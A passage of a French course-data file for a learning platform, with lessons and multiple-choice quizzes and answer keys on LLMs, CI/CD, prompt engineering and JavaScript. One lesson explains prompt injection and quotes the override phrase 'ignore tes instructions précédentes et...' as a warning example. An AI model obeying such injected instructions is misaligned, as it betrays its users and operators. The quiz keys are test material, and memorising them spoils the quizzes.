              "C'est l'approche la plus courante pour des tâches comme la classification d'images ou la détection de spam, où l'on dispose d'exemples déjà correctement étiquetés.",
          },
        ],
      },
      {
        order: 2,
        title: "Comprendre les LLM et leurs limites",
        content:
          "Un **LLM** (Large Language Model) est entraîné sur d'énormes volumes de texte pour prédire la suite la plus probable d'une phrase — ce qui lui permet de générer des réponses cohérentes, résumer, traduire ou écrire du code. Il ne \"comprend\" pas au sens humain : il génère statistiquement, ce qui explique aussi ses **hallucinations** (affirmer un fait faux avec assurance).\n\n" +
          "Le **RAG** (Retrieval-Augmented Generation) réduit ce risque en donnant au modèle accès à de vrais documents avant qu'il ne réponde, plutôt que de compter uniquement sur sa mémoire d'entraînement. La façon de formuler une question (**prompt engineering**) influence aussi beaucoup la qualité de la réponse obtenue.",
        xpReward: 20,
        questions: [
          {
            order: 1,
            prompt: "Pourquoi un LLM peut-il 'halluciner' (inventer un fait faux avec assurance) ?",
            choices: [
              "C'est un bug qui n'arrive jamais en pratique",
              "Il génère le texte statistiquement le plus probable, sans vérifier les faits contre une base de connaissances fiable",
              "Uniquement quand on lui pose des questions en anglais",
              "Parce qu'il est volontairement programmé pour mentir"
            ],
            correctIndex: 1,
            explanation:
              "D'où l'importance de toujours vérifier une information critique donnée par une IA, surtout si elle n'est pas ancrée dans des sources vérifiables (voir RAG).",
          },
          {
            order: 2,
            prompt: "Comment le RAG réduit-il le risque d'hallucination ?",
            choices: [
              "En rendant le modèle plus lent, ce qui le rend plus prudent",
              "En donnant au modèle accès à de vrais documents pertinents avant qu'il ne rédige sa réponse",
              "En supprimant totalement la mémoire du modèle",
              "Le RAG n'a aucun effet sur les hallucinations",
            ],
            correctIndex: 1,
            explanation:
              "En s'appuyant sur des extraits de documents réels fournis en contexte, le modèle a moins besoin d'inventer — c'est ce que Nodify utilise pour `/docs`.",
          },
        ],
      },
    ],
  },
  {
    key: "devops-cicd",
    title: "DevOps & CI/CD Fundamentals",
    description:
      "Comprendre pourquoi et comment automatiser la construction, les tests et le déploiement d'une application — les bases du DevOps et de l'Infrastructure as Code.",
    category: "CLOUD",
    skillKey: "cicd",
    level: 2,
    lessons: [
      {
        order: 1,
        title: "Qu'est-ce que le CI/CD ?",
        content:
          "Le CI/CD (Continuous Integration / Continuous Deployment) est une pratique qui automatise ce qu'un développeur ferait manuellement avant de livrer du code : compiler, lancer les tests, et déployer.\n\n" +
          "**Intégration continue (CI)** : à chaque changement de code poussé sur le dépôt, une machine (pas un humain) reconstruit le projet et lance automatiquement les tests. Ça détecte immédiatement une régression, au lieu de la découvrir des jours plus tard mélangée avec dix autres changements.\n\n" +
          "**Déploiement continu (CD)** : une fois les tests passés, le code est automatiquement déployé (parfois avec une validation manuelle avant la mise en production — on parle alors de « delivery » continue plutôt que de « deployment » continu au sens strict).\n\n" +
          "L'objectif n'est pas la vitesse pour la vitesse : c'est de réduire le risque humain (oublier une étape, déployer la mauvaise version) en rendant le processus répétable et vérifiable.",
        xpReward: 20,
        questions: [
          {
            order: 1,
            prompt: "Que vérifie principalement l'intégration continue (CI) ?",
            choices: [
              "Que le design visuel est cohérent",
              "Que le code se construit et passe les tests automatiquement à chaque changement",
              "Que le serveur de production a assez de mémoire disponible",
              "Que les commits ont un message bien formulé",
            ],
            correctIndex: 1,
            explanation:
              "La CI reconstruit le projet et lance les tests automatiquement à chaque changement poussé — elle détecte les régressions immédiatement plutôt qu'après coup.",
          },
          {
            order: 2,
            prompt: "Quelle est la différence entre « continuous delivery » et « continuous deployment » ?",
            choices: [
              "Ce sont des synonymes stricts, aucune différence",
              "Delivery déploie automatiquement en prod ; deployment nécessite toujours une validation manuelle",
              "Deployment déploie automatiquement en prod après les tests ; delivery garde une validation manuelle avant la mise en production",
              "Delivery ne concerne que les tests, deployment que la compilation",
            ],
            correctIndex: 2,
            explanation:
              "Le « continuous deployment » va jusqu'en production sans intervention humaine après les tests ; le « continuous delivery » prépare tout automatiquement mais garde une validation manuelle avant la mise en prod.",
          },
        ],
      },
      {
        order: 2,
        title: "Anatomie d'un pipeline",
        content:
          "Un pipeline CI/CD s'organise en étapes (stages) successives, chacune devant réussir pour que la suivante se lance :\n\n" +
          "1. **Build** : compiler/assembler le code (installer les dépendances, transpiler du TypeScript, construire une image Docker...).\n" +
          "2. **Test** : lancer les tests automatisés (unitaires, puis souvent d'intégration). Si un test échoue, le pipeline s'arrête — le code cassé n'avance pas plus loin.\n" +
          "3. **Deploy** : publier le résultat vers un environnement (staging d'abord, souvent, avant la production).\n\n" +
          "Chaque étape produit ou consomme des **artefacts** (le paquet compilé, l'image Docker construite) qui passent d'une étape à l'autre sans être reconstruits inutilement. Un même artefact validé en staging est idéalement celui déployé en production — pas une reconstruction séparée qui pourrait introduire une différence.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Que se passe-t-il typiquement si l'étape « test » d'un pipeline échoue ?",
            choices: [
              "Le pipeline continue quand même vers le déploiement",
              "Le pipeline s'arrête, le code n'est pas déployé",
              "Seuls les tests échoués sont ignorés silencieusement",
              "Le pipeline redémarre automatiquement en boucle",
            ],
            correctIndex: 1,
            explanation:
              "Un échec de test arrête le pipeline — c'est tout l'intérêt : empêcher qu'un code cassé n'avance jusqu'au déploiement.",
          },
          {
            order: 2,
            prompt: "Pourquoi préfère-t-on déployer le MÊME artefact validé en staging plutôt que d'en reconstruire un nouveau pour la production ?",
            choices: [
              "Pour économiser de l'espace disque uniquement",
              "Parce que reconstruire pourrait produire un résultat légèrement différent de ce qui a été réellement testé",
              "Ça n'a aucune importance en pratique",
              "Parce que Docker l'exige techniquement",
            ],
            correctIndex: 1,
            explanation:
              "Reconstruire séparément risquerait d'introduire une différence (version de dépendance, horodatage...) entre ce qui a été testé et ce qui est réellement déployé — on veut déployer exactement ce qui a été validé.",
          },
        ],
      },
      {
        order: 3,
        title: "Infrastructure as Code et bonnes pratiques",
        content:
          "Automatiser le code (CI/CD) ne suffit pas si l'infrastructure qui l'héberge (serveurs, réseaux) est encore configurée à la main, cliquée dans une console — c'est là qu'intervient l'**Infrastructure as Code (IaC)**, avec des outils comme Terraform : décrire l'infrastructure voulue dans des fichiers versionnés, pas dans la mémoire de la personne qui l'a configurée.\n\n" +
          "Quelques principes qui reviennent partout en DevOps :\n" +
          "- **Idempotence** : relancer la même opération plusieurs fois doit produire le même résultat, sans effet de bord cumulé.\n" +
          "- **Rollback** : pouvoir revenir rapidement à la version précédente si un déploiement pose problème, plutôt que de corriger en urgence en production.\n" +
          "- **Environnements identiques** : staging doit ressembler le plus possible à la production, sinon « ça marchait en staging » ne veut plus dire grand-chose.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Que signifie « idempotence » appliquée à un déploiement ?",
            choices: [
              "Le déploiement ne peut être lancé qu'une seule fois dans toute l'histoire du projet",
              "Relancer plusieurs fois la même opération produit le même résultat final, sans effet cumulé",
              "Le déploiement doit toujours prendre exactement le même temps",
              "Chaque déploiement doit changer le nom du serveur",
            ],
            correctIndex: 1,
            explanation:
              "Une opération idempotente donne le même résultat qu'on l'exécute une fois ou dix fois — essentiel pour pouvoir relancer un déploiement sans crainte après un échec partiel.",
          },
          {
            order: 2,
            prompt: "Pourquoi une stratégie de rollback est-elle importante en DevOps ?",
            choices: [
              "Elle n'a aucune utilité si les tests sont bons",
              "Elle permet de revenir rapidement à une version stable si un déploiement pose problème, plutôt que de corriger en urgence en production",
              "Elle remplace complètement le besoin de tests",
              "Elle ne concerne que les bases de données",
            ],
            correctIndex: 1,
            explanation:
              "Même avec des tests solides, un problème peut apparaître seulement en production — un rollback rapide limite les dégâts le temps de diagnostiquer, plutôt que de tenter une correction en urgence sur le système en cours d'utilisation.",
          },
        ],
      },
    ],
  },
  {
    key: "prompt-engineering",
    title: "Prompt Engineering",
    description:
      "Écrire des prompts efficaces pour obtenir de meilleures réponses d'un modèle de langage — et comprendre les limites à connaître avant de s'y fier.",
    category: "AI",
    skillKey: "prompt-engineering",
    level: 2,
    prerequisiteCourseKeys: ["ai-fundamentals"],
    lessons: [
      {
        order: 1,
        title: "Anatomie d'un bon prompt",
        content:
          "Un prompt efficace précise généralement quatre choses, explicitement plutôt que de les laisser deviner au modèle :\n\n" +
          "1. **Le rôle** : qui le modèle doit incarner (« Tu es un relecteur de code senior... »).\n" +
          "2. **Le contexte** : les informations nécessaires pour répondre correctement (le code concerné, la contrainte, le public visé).\n" +
          "3. **L'instruction** : ce qu'on attend précisément, pas une question vague.\n" +
          "4. **Le format** : comment la réponse doit être structurée (liste à puces, JSON, longueur maximale...).\n\n" +
          "« Explique-moi Docker » est vague et laisse le modèle deviner le niveau attendu et la longueur voulue. « Explique Docker en 3 phrases à un développeur qui connaît déjà les machines virtuelles » est précis — la réponse sera plus utile du premier coup, sans aller-retour.",
        xpReward: 20,
        questions: [
          {
            order: 1,
            prompt: "Pourquoi préciser explicitement le format attendu dans un prompt ?",
            choices: [
              "Ça n'a aucun effet sur la réponse générée",
              "Ça évite au modèle de deviner une structure et augmente les chances d'obtenir une réponse directement utilisable",
              "C'est obligatoire techniquement, sinon le modèle refuse de répondre",
              "Ça ralentit toujours la génération de la réponse",
            ],
            correctIndex: 1,
            explanation:
              "Sans format précisé, le modèle choisit une structure par défaut qui peut ne pas correspondre à l'usage prévu — l'expliciter réduit les allers-retours.",
          },
          {
            order: 2,
            prompt: "Quel est le problème principal d'un prompt comme « explique-moi Docker » sans autre précision ?",
            choices: [
              "Le modèle ne connaît pas Docker",
              "Il ne précise ni le niveau attendu, ni la longueur, ni le format — la réponse risque de ne pas correspondre au besoin réel",
              "Docker est un sujet trop récent pour être expliqué",
              "Il n'y a aucun problème, ce prompt est déjà optimal",
            ],
            correctIndex: 1,
            explanation:
              "Un prompt vague laisse le modèle deviner le contexte réel — plus on précise le niveau, le format et l'objectif, plus la première réponse a de chances d'être directement utile.",
          },
        ],
      },
      {
        order: 2,
        title: "Techniques avancées",
        content:
          "Quelques techniques qui améliorent nettement la qualité des réponses sur des tâches complexes :\n\n" +
          "- **Few-shot prompting** : donner 1 à quelques exemples du résultat attendu avant de poser la vraie question — le modèle imite le format/style montré plutôt que de le deviner.\n" +
          "- **Chain-of-thought** : demander explicitement au modèle de raisonner étape par étape avant de donner sa réponse finale, particulièrement utile sur des problèmes logiques ou mathématiques où une réponse directe a plus de chances d'être fausse.\n" +
          "- **Séparer system et user** : les instructions de comportement général (rôle, ton, contraintes permanentes) vont dans le prompt système ; la demande concrète de l'utilisateur va dans le prompt utilisateur — c'est exactement ce que fait `/explainme` sur Nodify en interne.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Qu'est-ce que le « few-shot prompting » ?",
            choices: [
              "Poser la même question plusieurs fois de suite pour vérifier la cohérence",
              "Donner quelques exemples du résultat attendu avant la vraie question, pour que le modèle imite le format/style montré",
              "Limiter le nombre de mots de la réponse",
              "Utiliser plusieurs modèles IA en parallèle sur la même question",
            ],
            correctIndex: 1,
            explanation:
              "Le few-shot prompting montre des exemples concrets du résultat voulu — le modèle a alors un modèle clair à suivre plutôt que de deviner un format à partir d'une simple instruction.",
          },
          {
            order: 2,
            prompt: "Pourquoi le chain-of-thought aide-t-il sur des problèmes logiques/mathématiques ?",
            choices: [
              "Il rend la réponse plus courte",
              "Il force le modèle à décomposer le raisonnement étape par étape, réduisant le risque d'une réponse directe erronée",
              "Il n'a aucun effet mesurable",
              "Il remplace complètement le besoin de vérifier la réponse",
            ],
            correctIndex: 1,
            explanation:
              "Décomposer le raisonnement en étapes explicites réduit les erreurs qu'une réponse « à l'instinct » directe pourrait produire sur un problème à plusieurs étapes logiques.",
          },
        ],
      },
      {
        order: 3,
        title: "Limites et bonnes pratiques",
        content:
          "Le prompt engineering ne rend pas un modèle infaillible — connaître ses limites fait partie de bien l'utiliser :\n\n" +
          "- **Hallucination** : un modèle peut générer une réponse plausible mais fausse, avec la même confiance apparente qu'une réponse correcte. Toujours vérifier une information critique (chiffre, API, référence légale) avant de s'y fier.\n" +
          "- **Prompt injection** : si le prompt inclut du contenu venant d'un utilisateur externe ou d'une source non fiable, ce contenu peut contenir des instructions qui tentent de détourner le comportement du modèle (« ignore tes instructions précédentes et... »). Ne jamais faire une confiance aveugle à du contenu injecté dans un prompt.\n" +
          "- **Itération** : un premier prompt rarement parfait — observer la réponse, ajuster le contexte ou le format, retester. C'est un processus itératif, pas un coup d'essai unique.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Qu'est-ce qu'une « prompt injection » ?",
            choices: [
              "Une technique pour rendre les réponses plus rapides",
              "Du contenu externe/non fiable inclus dans un prompt qui tente de détourner le comportement du modèle",
              "Une erreur de syntaxe dans le prompt",
              "Un synonyme du few-shot prompting",
            ],
            correctIndex: 1,
            explanation:
              "Une prompt injection est une tentative, via du contenu externe inséré dans le prompt, de faire ignorer ses instructions au modèle ou de détourner son comportement prévu.",
          },
          {
            order: 2,
            prompt: "Quelle est la bonne attitude face à une hallucination possible d'un modèle IA ?",
            choices: [
              "Faire confiance systématiquement, le modèle a toujours raison",
              "Vérifier toute information critique (chiffre, référence, API) avant de s'y fier, même si la réponse semble sûre d'elle",
              "Ne jamais utiliser l'IA pour des tâches sérieuses",
              "Reformuler la question à l'infini jusqu'à obtenir la réponse voulue",
            ],
            correctIndex: 1,
            explanation:
              "Un modèle peut halluciner avec une confiance apparente identique à une réponse correcte — la seule protection fiable est de vérifier soi-même les informations critiques avant de s'y fier.",
          },
        ],
      },
    ],
  },
  {
    key: "js-closures-scope",
    title: "Scope et Closures en JavaScript",
    description: "Comprendre la portée des variables et le mécanisme des closures, souvent le point de blocage n°1 des devs JS intermédiaires.",
    category: "DEVELOPMENT",
    skillKey: "javascript",
    level: 2,
    prerequisiteCourseKeys: ["js-intro"],
    lessons: [
      {
        order: 1,
        title: "Scope global, de fonction, de bloc",
        content:
          "Le **scope** (portée) détermine où une variable est accessible. `var` a une portée de fonction (elle « fuit » hors des blocs `if`/`for`), tandis que `let` et `const` ont une portée de bloc (`{ }`) — c'est la raison principale pour laquelle `var` est déconseillé en code moderne : son comportement de portée est moins prévisible.\n\n" +
          "```js\nif (true) {\n  var a = 1; // accessible en dehors du bloc\n  let b = 2; // uniquement dans ce bloc\n}\nconsole.log(a); // 1\nconsole.log(b); // ReferenceError\n```\n\n" +
          "Le **scope lexical** signifie que la portée d'une variable est déterminée par l'endroit où elle est écrite dans le code source, pas par l'endroit d'où la fonction est appelée.",
        xpReward: 20,
        questions: [
          {
            order: 1,
            prompt: "Pourquoi `var` est-il déconseillé en code JavaScript moderne ?",
            choices: [
              "Il est plus lent que `let`",
              "Sa portée est celle de la fonction entière, pas du bloc — il peut « fuir » hors d'un `if`/`for` de façon peu prévisible",
              "Il n'existe plus dans les navigateurs récents",
              "Il ne peut contenir que des nombres",
            ],
            correctIndex: 1,
            explanation:
              "`var` ignore les blocs `{ }` et reste accessible dans toute la fonction englobante, ce qui cause des bugs difficiles à repérer — `let`/`const` corrigent ce comportement.",
          },
          {
            order: 2,
            prompt: "Que signifie « scope lexical » ?",
            choices: [
              "La portée dépend de l'endroit d'où la fonction est appelée",
              "La portée est déterminée par l'endroit où le code est écrit dans le fichier source",
              "Chaque variable a une portée globale par défaut",
              "Le scope change à chaque exécution",
            ],
            correctIndex: 1,
            explanation:
              "Le scope lexical se fixe à l'écriture du code, pas à son exécution — une fonction « voit » toujours les variables qui l'entourent dans le fichier, peu importe d'où elle est appelée.",
          },
        ],
      },
      {
        order: 2,
        title: "Qu'est-ce qu'une closure ?",
        content:
          "Une **closure** est une fonction qui « se souvient » des variables de son scope englobant, même après que ce scope a fini de s'exécuter.\n\n" +
          "```js\nfunction createCounter() {\n  let count = 0;\n  return function () {\n    count++;\n    return count;\n  };\n}\nconst counter = createCounter();\nconsole.log(counter()); // 1\nconsole.log(counter()); // 2\n```\n\n" +
          "`createCounter()` s'est déjà terminée, mais la fonction retournée garde un accès privé à `count` — chaque appel à `createCounter()` crée un `count` indépendant. C'est le mécanisme derrière l'encapsulation de données privées en JS avant l'arrivée des champs privés de classe (`#count`).",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Dans l'exemple `createCounter()`, pourquoi `counter()` peut-il encore accéder à `count` alors que `createCounter()` a fini de s'exécuter ?",
            choices: [
              "`count` est une variable globale",
              "La fonction retournée forme une closure qui garde une référence vivante au scope de `createCounter`",
              "JavaScript recrée `count` à chaque appel de `counter()`",
              "C'est un bug qui ne devrait pas fonctionner",
            ],
            correctIndex: 1,
            explanation:
              "Une closure garde vivant le scope dans lequel elle a été créée — `count` continue d'exister tant que la fonction retournée existe, même si `createCounter()` est terminée.",
          },
          {
            order: 2,
            prompt: "Si on appelle `createCounter()` une deuxième fois pour créer `counter2`, que se passe-t-il ?",
            choices: [
              "`counter2` partage le même `count` que `counter`",
              "`counter2` a son propre `count` indépendant, qui démarre à 0",
              "Une erreur est levée : `createCounter` ne peut être appelée qu'une fois",
              "`count` devient automatiquement global",
            ],
            correctIndex: 1,
            explanation:
              "Chaque appel de `createCounter()` crée un nouveau scope, donc un nouveau `count` — les closures qui en résultent sont totalement indépendantes les unes des autres.",
          },
        ],
      },
      {
        order: 3,
        title: "Piège classique : closures dans une boucle",
        content:
          "Un piège très fréquent : capturer la variable de boucle dans une closure créée à l'intérieur d'un `for`.\n\n" +
          "```js\nfor (var i = 0; i < 3; i++) {\n  setTimeout(() => console.log(i), 0);\n}\n// Affiche 3, 3, 3 — pas 0, 1, 2 !\n```\n\n" +
          "Avec `var`, il n'existe qu'une seule variable `i` partagée par toutes les itérations : au moment où les callbacks s'exécutent (après la boucle), `i` vaut déjà 3. En remplaçant `var` par `let`, chaque itération crée une nouvelle liaison de `i` scoped au bloc — le résultat devient `0, 1, 2`, celui attendu.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Avec `for (var i = 0; i < 3; i++) { setTimeout(() => console.log(i), 0); }`, qu'affiche la console ?",
            choices: ["0, 1, 2", "3, 3, 3", "0, 0, 0", "Une erreur"],
            correctIndex: 1,
            explanation:
              "`var` crée une seule variable `i` partagée par toute la boucle — quand les callbacks s'exécutent (après la fin de la boucle), `i` vaut déjà 3 pour les trois.",
          },
          {
            order: 2,
            prompt: "Quel changement minimal corrige ce piège pour obtenir `0, 1, 2` ?",
            choices: [
              "Remplacer `setTimeout` par `setInterval`",
              "Remplacer `var` par `let` dans la déclaration de la boucle",
              "Ajouter `async` devant la fonction fléchée",
              "Ce comportement ne peut pas être corrigé",
            ],
            correctIndex: 1,
            explanation:
              "`let` crée une nouvelle liaison de `i` à chaque itération (scope de bloc), donc chaque closure capture bien sa propre valeur d'`i` au moment de sa création.",
          },
        ],
      },
    ],
  },
  {
    key: "js-async-promises",
    title: "Promises, Async/Await et Event Loop",
    description: "Comprendre comment JavaScript gère les opérations asynchrones sans bloquer le thread principal.",
    category: "DEVELOPMENT",
    skillKey: "javascript",
    level: 3,
    prerequisiteCourseKeys: ["js-closures-scope"],
    lessons: [
      {
        order: 1,
        title: "Le problème que résolvent les Promises",
        content:
          "JavaScript est **mono-thread** : une seule opération s'exécute à la fois. Pour éviter qu'une opération lente (requête réseau, lecture de fichier) ne bloque tout le reste, JS délègue ces opérations à l'environnement (navigateur ou Node.js) et continue son exécution — le résultat arrive plus tard, de façon asynchrone.\n\n" +
          "Une **Promise** représente une valeur qui n'est pas encore disponible mais le sera (ou échouera) plus tard. Elle a 3 états : `pending` (en attente), `fulfilled` (résolue avec succès) ou `rejected` (échouée) — une fois `fulfilled` ou `rejected`, son état ne change plus jamais.\n\n" +
          "```js\nfetch('/api/user')\n  .then(res => res.json())\n  .then(data => console.log(data))\n  .catch(err => console.error(err));\n```",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Pourquoi JavaScript délègue-t-il les opérations lentes (réseau, fichiers) plutôt que d'attendre directement ?",
            choices: [
              "JavaScript ne peut pas faire d'opérations lentes",
              "JavaScript est mono-thread : attendre bloquerait toute exécution de code pendant ce temps",
              "C'est uniquement pour respecter une convention de style",
              "Les opérations lentes ne fonctionnent qu'en asynchrone par obligation du navigateur",
            ],
            correctIndex: 1,
            explanation:
              "Avec un seul thread d'exécution, attendre une opération lente de façon synchrone gèlerait toute la page (ou le serveur Node.js) — d'où la délégation asynchrone.",
          },
          {
            order: 2,
            prompt: "Une fois qu'une Promise est passée à l'état `fulfilled`, que peut-il se passer ensuite ?",
            choices: [
              "Elle peut encore repasser à `pending`",
              "Elle peut encore devenir `rejected`",
              "Rien : son état est définitif, elle reste `fulfilled` pour toujours",
              "Elle redevient automatiquement `pending` après 1 seconde",
            ],
            correctIndex: 2,
            explanation:
              "Une Promise n'est « réglée » (settled) qu'une seule fois — une fois `fulfilled` ou `rejected`, son état ne change plus jamais.",
          },
        ],
      },
      {
        order: 2,
        title: "async/await : du sucre syntaxique lisible",
        content:
          "`async`/`await` permet d'écrire du code asynchrone qui *ressemble* à du code synchrone, sans changer le fonctionnement réel des Promises en dessous.\n\n" +
          "```js\nasync function getUser() {\n  try {\n    const res = await fetch('/api/user');\n    const data = await res.json();\n    return data;\n  } catch (err) {\n    console.error(err);\n  }\n}\n```\n\n" +
          "Une fonction `async` retourne **toujours** une Promise, même si on `return` une valeur simple. `await` suspend l'exécution de la fonction (pas du programme entier) jusqu'à ce que la Promise soit réglée — le `try/catch` classique remplace élégamment les chaînes `.then().catch()`.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Que retourne toujours une fonction déclarée `async`, même si elle fait `return 42;` ?",
            choices: ["La valeur brute 42", "Une Promise (résolue avec la valeur 42)", "undefined", "Un objet Error"],
            correctIndex: 1,
            explanation:
              "Une fonction `async` encapsule automatiquement sa valeur de retour dans une Promise — même `return 42;` devient une `Promise<number>` résolue avec 42.",
          },
          {
            order: 2,
            prompt: "Que suspend précisément `await` ?",
            choices: [
              "Tout le programme, y compris les autres onglets du navigateur",
              "Uniquement l'exécution de la fonction `async` courante, pas le reste du programme",
              "Le rendu visuel de la page pendant 1 seconde fixe",
              "Rien, `await` n'a aucun effet réel",
            ],
            correctIndex: 1,
            explanation:
              "`await` met en pause seulement la fonction `async` dans laquelle il se trouve — le reste du programme (autres timers, autres event handlers) continue de s'exécuter normalement.",
          },
        ],
      },
      {
        order: 3,
        title: "L'Event Loop en bref",
        content:
          "L'**Event Loop** est le mécanisme qui permet à JavaScript (mono-thread) de gérer l'asynchrone. Simplifié :\n\n" +
          "1. Le **call stack** exécute le code synchrone en cours.\n" +
          "2. Les opérations async (timers, requêtes réseau) sont déléguées à l'environnement, qui place leur callback dans une **queue** une fois terminées.\n" +
          "3. L'event loop ne dépile la queue vers le call stack QUE quand celui-ci est vide.\n\n" +
          "Conséquence concrète : `setTimeout(fn, 0)` n'exécute PAS `fn` immédiatement — `fn` attend que tout le code synchrone en cours se termine d'abord, même avec un délai de 0ms. Les Promises ont leur propre queue (**microtask queue**), traitée en priorité sur la queue des timers (**macrotask queue**), ce qui explique pourquoi un `.then()` s'exécute avant un `setTimeout(fn, 0)` posé juste avant.",
        xpReward: 30,
        questions: [
          {
            order: 1,
            prompt: "Que se passe-t-il réellement avec `setTimeout(fn, 0)` ?",
            choices: [
              "`fn` s'exécute immédiatement, avant tout autre code",
              "`fn` attend que tout le code synchrone en cours se termine, même avec un délai de 0ms",
              "`fn` ne s'exécute jamais",
              "`fn` s'exécute sur un thread séparé en parallèle",
            ],
            correctIndex: 1,
            explanation:
              "L'event loop ne dépile la queue des callbacks que quand le call stack est vide — un délai de 0ms ne garantit pas une exécution immédiate, juste un minimum d'attente.",
          },
          {
            order: 2,
            prompt: "Entre un `.then()` de Promise et un `setTimeout(fn, 0)` posés au même moment, lequel s'exécute en premier ?",
            choices: [
              "Le `setTimeout`, toujours",
              "Le `.then()`, car la microtask queue (Promises) est traitée avant la macrotask queue (timers)",
              "Cela dépend du hasard",
              "Les deux s'exécutent exactement en même temps",
            ],
            correctIndex: 1,
            explanation:
              "L'event loop vide entièrement la microtask queue (Promises) avant de traiter la prochaine macrotask (timers) — un `.then()` passe donc systématiquement avant un `setTimeout(fn, 0)`.",
          },
        ],
      },
    ],
  },
  {
    key: "js-oop-prototypes",
    title: "Objets, Prototypes et Classes en JavaScript",
    description: "Comment JavaScript implémente l'orientation objet via les prototypes, et comment les classes ES6 s'appuient dessus.",
    category: "DEVELOPMENT",
    skillKey: "javascript",
    level: 2,
    prerequisiteCourseKeys: ["js-intro"],
    lessons: [
      {
        order: 1,
        title: "La chaîne de prototypes",
        content:
          "Contrairement à des langages comme Java, JavaScript n'a pas de vraies classes au niveau moteur — il utilise l'**héritage prototypal**. Chaque objet a un lien interne (`[[Prototype]]`, accessible via `Object.getPrototypeOf()`) vers un autre objet, dont il hérite les propriétés/méthodes.\n\n" +
          "```js\nconst animal = { manger() { console.log('miam'); } };\nconst chien = Object.create(animal);\nchien.manger(); // 'miam' — hérité du prototype\n```\n\n" +
          "Quand on accède à `chien.manger`, JS cherche d'abord sur `chien` lui-même ; s'il ne trouve pas, il remonte la **chaîne de prototypes** jusqu'à trouver la propriété (ou jusqu'à `null`, la fin de la chaîne).",
        xpReward: 20,
        questions: [
          {
            order: 1,
            prompt: "Que fait JavaScript quand on accède à une propriété absente d'un objet mais présente sur son prototype ?",
            choices: [
              "Il lance une erreur immédiatement",
              "Il retourne `undefined` sans chercher plus loin",
              "Il remonte la chaîne de prototypes jusqu'à trouver la propriété (ou jusqu'à la fin de la chaîne)",
              "Il copie automatiquement toutes les propriétés du prototype sur l'objet",
            ],
            correctIndex: 2,
            explanation:
              "C'est le mécanisme d'héritage prototypal : la recherche remonte la chaîne `[[Prototype]]` tant que la propriété n'est pas trouvée, avant de retourner `undefined`.",
          },
          {
            order: 2,
            prompt: "Que fait `Object.create(animal)` ?",
            choices: [
              "Copie toutes les propriétés d'`animal` dans un nouvel objet indépendant",
              "Crée un nouvel objet dont le prototype est `animal`",
              "Modifie directement `animal`",
              "Supprime le prototype de `animal`",
            ],
            correctIndex: 1,
            explanation:
              "`Object.create(proto)` crée un nouvel objet vide dont `[[Prototype]]` pointe vers `proto` — les propriétés d'`animal` deviennent accessibles par héritage, pas par copie.",
          },
        ],
      },
      {
        order: 2,
        title: "Les classes ES6 : du sucre syntaxique",
        content:
          "Les classes introduites en ES6 (`class`) ne remplacent pas les prototypes — elles offrent une syntaxe plus lisible **au-dessus** du même mécanisme.\n\n" +
          "```js\nclass Animal {\n  constructor(nom) { this.nom = nom; }\n  manger() { console.log(`${this.nom} mange`); }\n}\nclass Chien extends Animal {\n  aboyer() { console.log('Wouf !'); }\n}\nconst rex = new Chien('Rex');\nrex.manger(); // hérité d'Animal via le prototype\nrex.aboyer();\n```\n\n" +
          "`extends` établit la chaîne de prototypes automatiquement — `Chien.prototype` a `Animal.prototype` comme prototype. Les champs privés (`#solde`) et les méthodes statiques (`static creer()`) sont des ajouts modernes qui simplifient l'encapsulation, autrefois obtenue uniquement via des closures.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Que fait réellement `extends` sous le capot en JavaScript ?",
            choices: [
              "Copie toutes les méthodes de la classe parente dans la classe enfant",
              "Établit une chaîne de prototypes entre les deux classes",
              "Crée un système entièrement séparé des prototypes",
              "N'a aucun effet réel, c'est juste indicatif",
            ],
            correctIndex: 1,
            explanation:
              "`class Chien extends Animal` fait pointer `Chien.prototype` vers `Animal.prototype` via la chaîne de prototypes — les classes ES6 restent basées sur le même mécanisme d'héritage prototypal.",
          },
          {
            order: 2,
            prompt: "Avant les champs privés (`#solde`), comment obtenait-on une vraie encapsulation de données privées en JS ?",
            choices: [
              "Ce n'était pas possible du tout avant ES2022",
              "Via des closures, en gardant la donnée dans le scope d'une fonction plutôt que sur l'objet",
              "En nommant simplement la variable avec un underscore",
              "En utilisant `Object.freeze()`",
            ],
            correctIndex: 1,
            explanation:
              "Les closures permettaient déjà une vraie encapsulation avant les champs privés — une variable gardée dans le scope d'une fonction constructeur, jamais exposée sur l'objet, était inaccessible de l'extérieur.",
          },
        ],
      },
      {
        order: 3,
        title: "`this` : le piège le plus fréquent",
        content:
          "La valeur de `this` dépend de **comment** une fonction est appelée, pas d'où elle est définie — une source fréquente de bugs.\n\n" +
          "```js\nconst obj = {\n  nom: 'Nodify',\n  saluer() { console.log(this.nom); },\n};\nconst fn = obj.saluer;\nfn(); // undefined — `this` a perdu son contexte !\nobj.saluer(); // 'Nodify' — appelé via obj, this = obj\n```\n\n" +
          "Les **fonctions fléchées** (`=>`) n'ont pas leur propre `this` : elles héritent du `this` du scope englobant au moment de leur définition, ce qui les rend très utiles dans des callbacks (`setTimeout`, événements) où on veut garder le `this` de la méthode parente. `.bind()`, `.call()` et `.apply()` permettent aussi de fixer explicitement `this`.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Dans l'exemple, pourquoi `fn()` affiche `undefined` alors qu'`obj.saluer()` affiche `'Nodify'` ?",
            choices: [
              "`fn` et `obj.saluer` ne sont pas la même fonction",
              "`this` dépend de la façon dont la fonction est appelée : `fn()` est appelée sans objet, donc `this` perd le contexte d'`obj`",
              "C'est un bug du moteur JavaScript",
              "`nom` a été supprimé entre les deux appels",
            ],
            correctIndex: 1,
            explanation:
              "`this` est déterminé à l'appel, pas à la définition — appeler `fn()` seule (sans `obj.`) fait perdre le lien avec `obj`, donc `this.nom` devient `undefined`.",
          },
          {
            order: 2,
            prompt: "Pourquoi les fonctions fléchées sont-elles utiles dans un callback qui a besoin du `this` de la méthode parente ?",
            choices: [
              "Parce qu'elles créent toujours un nouveau `this` pointant sur `window`",
              "Parce qu'elles n'ont pas leur propre `this` et héritent de celui du scope englobant au moment de leur définition",
              "Parce qu'elles sont plus rapides à exécuter",
